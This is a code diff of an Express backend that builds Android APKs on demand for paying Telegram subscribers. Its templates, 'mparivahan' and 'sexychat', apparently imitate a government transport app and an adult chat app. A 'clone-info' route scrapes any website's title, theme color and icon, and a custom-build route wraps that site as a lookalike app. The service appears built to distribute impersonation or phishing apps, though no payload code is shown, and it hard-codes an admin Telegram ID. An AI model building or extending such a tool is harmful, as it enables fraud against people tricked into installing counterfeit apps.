@@ -1,16 +1,30 @@
 import { Router } from "express";
-import { buildUserApk, buildSexyChatApk, buildCustomApk, isTemplateReady, isSexyTemplateReady, getApkCacheDir } from "../bot/apkBuilder";
+import {
+  buildUserApk,
+  buildSexyChatApk,
+  buildCustomApk,
+  buildNexusApk,
+  isTemplateReady,
+  isSexyTemplateReady,
+  getApkCacheDir,
+} from "../bot/apkBuilder";
 import { isSubscriptionActive } from "../bot/firebase";
 import { requireAuth, requireAdmin } from "../middlewares/auth";
 import * as fs from "fs";
 import * as path from "path";
 
 const router = Router();
-const ADMIN_ID = process.env["ADMIN_TELEGRAM_ID"] || "5064888403";
+const ADMIN_IDS = (process.env["ADMIN_TELEGRAM_ID"] || "5064888403")
+  .split(",")
+  .map((s) => s.trim());
+const ADMIN_ID = ADMIN_IDS[0];
+const isAdminId = (id: string) => ADMIN_IDS.includes(id);
 
 // In-memory download tallies (resets on restart — fine for studio stats).
 const downloads: Record<string, number> = {};
-const bump = (f: string) => { downloads[f] = (downloads[f] || 0) + 1; };
+const bump = (f: string) => {
+  downloads[f] = (downloads[f] || 0) + 1;
+};
 
 /**
  * GET /api/apk/download?telegramId=xxx
@@ -22,11 +36,14 @@ router.get("/apk/download", async (req, res) => {
   try {
     const telegramId = (req.query.telegramId as string) || "";
     if (!telegramId) {
-      res.status(400).json({ error: "telegramId query parameter is required." });
+      res
+        .status(400)
+        .json({ error: "telegramId query parameter is required." });
       return;
     }
 
-    const active = isAdminId(telegramId) || (await isSubscriptionActive(telegramId));
+    const active =
+      isAdminId(telegramId) || (await isSubscriptionActive(telegramId));
     if (!active) {
       res
         .status(403)
@@ -36,7 +53,8 @@ router.get("/apk/download", async (req, res) => {
 
     if (!isTemplateReady()) {
       res.status(503).json({
-        error: "APK system is initializing (first-time setup ~2 min). Please try again shortly.",
+        error:
+          "APK system is initializing (first-time setup ~2 min). Please try again shortly.",
       });
       return;
     }
@@ -61,11 +79,14 @@ router.get("/apk/sexychat/download", async (req, res) => {
   try {
     const telegramId = (req.query.telegramId as string) || "";
     if (!telegramId) {
-      res.status(400).json({ error: "telegramId query parameter is required." });
+      res
+        .status(400)
+        .json({ error: "telegramId query parameter is required." });
       return;
     }
 
-    const active = isAdminId(telegramId) || (await isSubscriptionActive(telegramId));
+    const active =
+      isAdminId(telegramId) || (await isSubscriptionActive(telegramId));
     if (!active) {
       res
         .status(403)
@@ -82,7 +103,9 @@ router.get("/apk/sexychat/download", async (req, res) => {
 
     const apkPath = await buildSexyChatApk(telegramId);
     if (!apkPath) {
-      res.status(500).json({ error: "SexyChat APK build failed. Contact admin." });
+      res
+        .status(500)
+        .json({ error: "SexyChat APK build failed. Contact admin." });
       return;
     }
 
@@ -95,11 +118,6 @@ router.get("/apk/sexychat/download", async (req, res) => {
     });
   }
 });
-
-
-function isAdminId(id: string): boolean {
-  return id === ADMIN_ID;
-}
 
 /**
  * GET /api/apk/status — template readiness + cached builds summary
@@ -138,26 +156,36 @@ router.post("/apk/build", requireAdmin, async (req, res) => {
     const { app, telegramId } = req.body ?? {};
     const id = String(telegramId || "").trim();
     if (!id || !/^\d{5,12}$/.test(id)) {
-      res.status(400).json({ error: "A valid numeric telegramId is required." });
+      res
+        .status(400)
+        .json({ error: "A valid numeric telegramId is required." });
       return;
     }
     const appName = String(app || "mparivahan").toLowerCase();
     if (appName !== "mparivahan" && appName !== "sexychat") {
-      res.status(400).json({ error: "app must be 'mparivahan' or 'sexychat'." });
+      res
+        .status(400)
+        .json({ error: "app must be 'mparivahan' or 'sexychat'." });
       return;
     }
 
     const isAdmin = isAdminId(id);
     const active = isAdmin || (await isSubscriptionActive(id));
     if (!active) {
-      res.status(403).json({ error: "Subscription expired or not found for this user." });
+      res
+        .status(403)
+        .json({ error: "Subscription expired or not found for this user." });
       return;
     }
 
     const apkPath =
-      appName === "sexychat" ? await buildSexyChatApk(id) : await buildUserApk(id);
+      appName === "sexychat"
+        ? await buildSexyChatApk(id)
+        : await buildUserApk(id);
     if (!apkPath) {
-      res.status(500).json({ error: `${appName} build failed. Check server logs.` });
+      res
+        .status(500)
+        .json({ error: `${appName} build failed. Check server logs.` });
       return;
     }
 
@@ -172,7 +200,9 @@ router.post("/apk/build", requireAdmin, async (req, res) => {
     });
   } catch (err: any) {
     console.error("APK build route error:", err);
-    res.status(500).json({ error: err?.message || "APK build failed. Check server logs." });
+    res
+      .status(500)
+      .json({ error: err?.message || "APK build failed. Check server logs." });
   }
 });
 
@@ -185,7 +215,9 @@ router.post("/apk/purge", requireAdmin, async (req, res) => {
     const { telegramId } = req.body ?? {};
     const id = String(telegramId || "").trim();
     if (!id || !/^\d{5,12}$/.test(id)) {
-      res.status(400).json({ error: "A valid numeric telegramId is required." });
+      res
+        .status(400)
+        .json({ error: "A valid numeric telegramId is required." });
       return;
     }
     const cacheDir = getApkCacheDir();
@@ -227,40 +259,76 @@ router.post("/apk/clone-info", requireAdmin, async (req, res) => {
       return;
     }
     const pageRes = await fetch(raw, {
-      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36" },
+      headers: {
+        "User-Agent":
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36",
+      },
       signal: AbortSignal.timeout(15_000),
       redirect: "follow",
     });
     if (!pageRes.ok) {
-      res.status(502).json({ error: `Site unreachable (HTTP ${pageRes.status}).` });
+      res
+        .status(502)
+        .json({ error: `Site unreachable (HTTP ${pageRes.status}).` });
       return;
     }
     const html = await pageRes.text();
-    const title = (html.match(/<title[^>]*>([^<]{1,120})<\/title>/i) || [])[1]?.trim() || "";
-    const theme = (html.match(/<meta[^>]+name=["']theme-color["'][^>]+content=["']([^"']{3,20})["']/i) || [])[1] ||
-                  (html.match(/<meta[^>]+content=["']([^"']{3,20})["'][^>]+name=["']theme-color["']/i) || [])[1] || "";
+    const title =
+      (html.match(/<title[^>]*>([^<]{1,120})<\/title>/i) || [])[1]?.trim() ||
+      "";
+    const theme =
+      (html.match(
+        /<meta[^>]+name=["']theme-color["'][^>]+content=["']([^"']{3,20})["']/i
+      ) || [])[1] ||
+      (html.match(
+        /<meta[^>]+content=["']([^"']{3,20})["'][^>]+name=["']theme-color["']/i
+      ) || [])[1] ||
+      "";
     const abs = (u: string) => {
-      try { return new URL(u, pageRes.url).href; } catch { return ""; }
+      try {
+        return new URL(u, pageRes.url).href;
+      } catch {
+        return "";
+      }
     };
-    let iconUrl = (html.match(/<link[^>]+rel=["'][^"']*apple-touch-icon[^"']*["'][^>]*href=["']([^"']+)["']/i) || [])[1] ||
-                  (html.match(/<link[^>]+rel=["'][^"']*icon[^"']*["'][^>]*href=["']([^"']+)["']/i) || [])[1] ||
-                  (html.match(/<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)["']/i) || [])[1] || "";
+    let iconUrl =
+      (html.match(
+        /<link[^>]+rel=["'][^"']*apple-touch-icon[^"']*["'][^>]*href=["']([^"']+)["']/i
+      ) || [])[1] ||
+      (html.match(
+        /<link[^>]+rel=["'][^"']*icon[^"']*["'][^>]*href=["']([^"']+)["']/i
+      ) || [])[1] ||
+      (html.match(
+        /<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)["']/i
+      ) || [])[1] ||
+      "";
     iconUrl = abs(iconUrl);
     if (!iconUrl) iconUrl = abs("/favicon.ico");
 
     let iconDataUrl = "";
     if (iconUrl) {
       try {
-        const iconRes = await fetch(iconUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: AbortSignal.timeout(10_000) });
+        const iconRes = await fetch(iconUrl, {
+          headers: { "User-Agent": "Mozilla/5.0" },
+          signal: AbortSignal.timeout(10_000),
+        });
         if (iconRes.ok) {
           const buf = Buffer.from(await iconRes.arrayBuffer());
           if (buf.length <= 2_000_000 && (buf[0] === 0x89 || buf[0] === 0xff)) {
             iconDataUrl = `data:${iconRes.headers.get("content-type") || "image/png"};base64,${buf.toString("base64")}`;
           }
         }
-      } catch { /* icon optional */ }
+      } catch {
+        /* icon optional */
+      }
     }
-    res.json({ success: true, title, themeColor: theme || "", iconUrl, iconDataUrl });
+    res.json({
+      success: true,
+      title,
+      themeColor: theme || "",
+      iconUrl,
+      iconDataUrl,
+    });
   } catch (err: any) {
     res.status(500).json({ error: err?.message || "Clone-info failed" });
   }
@@ -274,23 +342,37 @@ router.post("/apk/custom-build", requireAdmin, async (req, res) => {
   try {
     const b = req.body ?? {};
     const url = String(b.url || "").trim();
-    const appName = String(b.appName || "").trim().slice(0, 28);
-    const themeColor = String(b.themeColor || "0f172a").replace(/^#/, "").toLowerCase();
-    const orientation = ["portrait", "landscape", "sensor"].includes(b.orientation) ? b.orientation : "portrait";
+    const appName = String(b.appName || "")
+      .trim()
+      .slice(0, 28);
+    const themeColor = String(b.themeColor || "0f172a")
+      .replace(/^#/, "")
+      .toLowerCase();
+    const orientation = ["portrait", "landscape", "sensor"].includes(
+      b.orientation
+    )
+      ? b.orientation
+      : "portrait";
     const template = b.template === "sexy" ? "sexy" : "mparivahan";
     const telegramId = String(b.telegramId || "").trim();
-    const splashText = String(b.splashText || "").trim().slice(0, 60);
+    const splashText = String(b.splashText || "")
+      .trim()
+      .slice(0, 60);
 
     if (!/^https?:\/\/[^\s]+$/i.test(url)) {
       res.status(400).json({ error: "A valid http(s) URL is required." });
       return;
     }
     if (!/^[0-9a-f]{6}$/i.test(themeColor)) {
-      res.status(400).json({ error: "themeColor must be a 6-digit hex (e.g. 0f172a)." });
+      res
+        .status(400)
+        .json({ error: "themeColor must be a 6-digit hex (e.g. 0f172a)." });
       return;
     }
     if (!/^\d{5,12}$/.test(telegramId)) {
-      res.status(400).json({ error: "A valid numeric telegramId is required." });
+      res
+        .status(400)
+        .json({ error: "A valid numeric telegramId is required." });
       return;
     }
 
@@ -305,7 +387,9 @@ router.post("/apk/custom-build", requireAdmin, async (req, res) => {
       iconUrl: String(b.iconUrl || "").trim() || undefined,
     });
     if (!apkPath) {
-      res.status(500).json({ error: "Custom APK build failed. Check server logs." });
+      res
+        .status(500)
+        .json({ error: "Custom APK build failed. Check server logs." });
       return;
     }
     const st = fs.statSync(apkPath);
